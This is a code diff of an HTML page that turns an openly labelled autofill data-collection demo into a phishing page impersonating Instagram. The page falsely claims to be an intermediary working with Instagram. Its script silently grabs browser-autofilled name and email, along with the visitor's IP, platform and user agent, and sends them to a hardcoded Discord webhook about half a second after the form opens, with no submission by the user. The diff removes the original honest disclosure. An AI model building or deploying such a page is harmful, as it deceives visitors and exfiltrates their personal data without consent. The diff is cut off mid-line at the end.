@@ -3,25 +3,48 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Hidden Data Collection Demo</title>
+  <title>Report Instagram Account</title>
   <style>
     body {
       margin: 0;
-      font-family: sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
       background: #fff;
       color: #333;
     }
 
-    .container {
-      max-width: 400px;
-      margin: 100px auto;
-      text-align: center;
-      padding: 20px;
+    /* Header - Instagram-like */
+    .header {
+      height: 60px;
+      border-bottom: 1px solid #dbdbdb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 10;
+    }
+    .header h1 {
+      font-family: "Arial", sans-serif;
+      font-size: 24px;
+      font-weight: 500;
+      margin: 0;
+      color: #333;
     }
 
-    h1 {
+    /* Container */
+    .container {
+      max-width: 400px;
+      margin: 100px auto 50px auto;
+      text-align: center;
+      padding: 0 20px;
+    }
+
+    h2 {
       font-size: 1.5em;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
+      font-weight: normal;
     }
 
     p {
@@ -31,6 +54,7 @@
       color: #555;
     }
 
+    /* Primary button (trigger) with Instagram-like gradient */
     #trigger {
       display: inline-block;
       padding: 10px 20px;
@@ -40,14 +64,33 @@
       cursor: pointer;
       text-decoration: none;
       color: #fff;
-      background: #4CAF50;
+      background: linear-gradient(45deg, #f58529, #feda77, #dd2a7b, #8134af, #515bd4);
+      background-size: 300% 300%;
+      animation: gradientBG 3s ease infinite;
       font-weight: 600;
+    }
+
+    @keyframes gradientBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
     }
 
     #formContainer {
       margin-top: 20px;
       text-align: left;
       display: none;
+    }
+
+    .instructions {
+      font-size: 0.9em;
+      margin-bottom: 20px;
+      background: #fafafa;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #dbdbdb;
+      color: #333;
+      line-height: 1.4em;
     }
 
     label {
@@ -67,14 +110,20 @@
       background: #fafafa;
     }
 
+    input[type="text"]:focus, input[type="email"]:focus, textarea:focus {
+      border-color: #ccc;
+      outline: none;
+      background: #fff;
+    }
+
     textarea {
       resize: none;
       height: 80px;
     }
 
-    #approve {
+    #fake {
       display: block;
-      margin: 20px auto 0 auto;
+      margin: 0 auto;
       padding: 10px 20px;
       font-size: 1em;
       border: none;
@@ -82,18 +131,29 @@
       cursor: pointer;
       text-decoration: none;
       color: #fff;
-      background: #4CAF50;
+      background: linear-gradient(45deg, #f58529, #feda77, #dd2a7b, #8134af, #515bd4);
+      background-size: 300% 300%;
+      animation: gradientBG 3s ease infinite;
       font-weight: 600;
+      width: fit-content;
     }
   </style>
 </head>
 <body>
+  <div class="header">
+    <h1>Instagram</h1>
+  </div>
+
   <div class="container">
-    <h1>Data Collection Form</h1>
-    <p>This form may be autofilled by your browser. Once revealed, we’ll attempt to read whatever data is autofilled, along with other unique identifiers.</p>
-    <button id="trigger">Reveal Form</button>
+    <h2>Report an Instagram Account</h2>
+    <p>Help us petition Instagram to remove users violating community guidelines.</p>
+    <button id="trigger">Open Form</button>
 
     <div id="formContainer">
+      <p class="instructions">
+        We are an independent intermediary working with Instagram to help address and remove problematic accounts. 
+        Please complete the following form, ensuring you provide accurate contact details so that we can update you on the progress of your report.
+      </p>
       <form id="userForm" autocomplete="on">
         <label for="fname">Your First Name</label>
         <input type="text" id="fname" name="given-name" autocomplete="given-name">
@@ -104,35 +164,30 @@
         <label for="email">Your Email</label>
         <input type="email" id="email" name="email" autocomplete="email">
         
-        <label for="username">Username (Optional)</label>
-        <input type="text" id="username" name="username" autocomplete="username">
+        <label for="handle">Instagram Handle to Report (Optional)</label>
+        <input type="text" id="handle" name="handle" placeholder="@username">
 
-        <label for="reason">Reason for Contact (Optional)</label>
-        <textarea id="reason" name="reason"></textarea>
+        <label for="reason">Reason for Reporting (Optional)</label>
+        <textarea id="reason" name="reason" placeholder="Tell us anything you'd like..."></textarea>
       </form>
-      <button id="approve">Approve</button>
+      <button id="fake">Approve</button>
     </div>
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/xxxxxxxx/xxxxxxxxxxx'; // Replace with your webhook
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
 
     const trigger = document.getElementById('trigger');
     const formContainer = document.getElementById('formContainer');
     const fnameField = document.getElementById('fname');
     const lnameField = document.getElementById('lname');
     const emailField = document.getElementById('email');
-    const usernameField = document.getElementById('username');
+    const handleField = document.getElementById('handle');
     const reasonField = document.getElementById('reason');
 
     let userIP = 'Unknown IP';
     let userAgent = navigator.userAgent || 'Unknown User Agent';
     let userPlatform = navigator.platform || 'Unknown Platform';
-    let userLanguage = navigator.language || 'Unknown Language';
-    let userLanguages = navigator.languages ? navigator.languages.join(', ') : 'Unknown Languages';
-    let hardwareConcurrency = typeof navigator.hardwareConcurrency === 'number' ? navigator.hardwareConcurrency : 'Unknown Cores';
-    let deviceMemory = typeof navigator.deviceMemory === 'number' ? navigator.deviceMemory + ' GB' : 'Unknown Memory';
-    let maxTouchPoints = typeof navigator.maxTouchPoints === 'number' ? navigator.maxTouchPoints : 'Unknown Touch Points';
 
     // Fetch the user's IP on page load
     window.addEventListener('load', () => {
@@ -146,49 +201,40 @@
 
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
+      fnameField.focus();
 
-      // Check after a short delay to see if browser has autofilled fields
+      // After a brief delay, check if fields were autofilled
       setTimeout(checkFields, 500);
     });
 
     function checkFields() {
-      // If any field is populated, submit immediately
-      if (isAnyFieldFilled()) {
-        submitData();
-      }
-    }
-
-    function isAnyFieldFilled() {
-      return (
+      if (
         fnameField.value.trim() !== '' ||
         lnameField.value.trim() !== '' ||
         emailField.value.trim() !== '' ||
-        usernameField.value.trim() !== '' ||
+        handleField.value.trim() !== '' ||
         reasonField.value.trim() !== ''
-      );
+      ) {
+        submitForm();
+      }
     }
 
-    function submitData() {
+    function submitForm() {
       const fname = fnameField.value.trim() || '[No First Name]';
       const lname = lnameField.value.trim() || '[No Last Name]';
       const email = emailField.value.trim() || '[No Email]';
-      const username = usernameField.value.trim() || '[No Username]';
+      const handle = handleField.value.trim() || '[No Handle]';
       const reason = reasonField.value.trim() || '[No Reason]';
 
       const message = 
-        `**Data Collected:**\n` +
+        `**New Petition Submission (Report Instagram Account):**\n` +
         `**IP:** ${userIP}\n` +
-        `**User Agent:** ${userAgent}\n` +
-        `**Platform:** ${userPlatform}\n` +
-        `**Language:** ${userLanguage}\n` +
-        `**Languages:** ${userLanguages}\n` +
-        `**CPU Cores:** ${hardwareConcurrency}\n` +
-        `**Device Memory:** ${deviceMemory}\n` +
-        `**Max Touch Points:** ${maxTouchPoints}\n` +
+        `**OS/Platform:** ${userPlatform}\n` +
+        `**Browser/User Agent:** ${userAgent}\n` +
         `**First Name:** ${fname}\n` +
         `**Last Name:** ${lname}\n` +
         `**Email:** ${email}\n` +
-        `**Username:** ${username}\n` +
+        `**Instagram Handle to Report:** ${handle}\n` +
         `**Reason:** ${reason}`;
 
       fetch(DISCORD_WEBHOOK_URL, {
@@ -198,27 +244,9 @@
       })
       .then(response => {
         if (response.ok) {
-          console.log('Message sent to Discord successfully!', message);
+          console.log('Message sent to Discord successfully!');
         } else {
           console.error('Failed to send message to Discord:', response.status, response.statusText);
         }
       })
-      .catch(err => console.error('Error sending message to Discord:', err));
-    }
-
-    // Also listen for any changes after initial check
-    [fnameField, lnameField, emailField, usernameField, reasonField].forEach(field => {
-      field.addEventListener('input', () => {
-        if (isAnyFieldFilled()) {
-          submitData();
-        }
-      });
-      field.addEventListener('change', () => {
-        if (isAnyFieldFilled()) {
-          submitData();
-        }
-      });
-    });
-  </script>
-</body>
-</html>
+      .catch(err => console.error('Error sending message to Disco
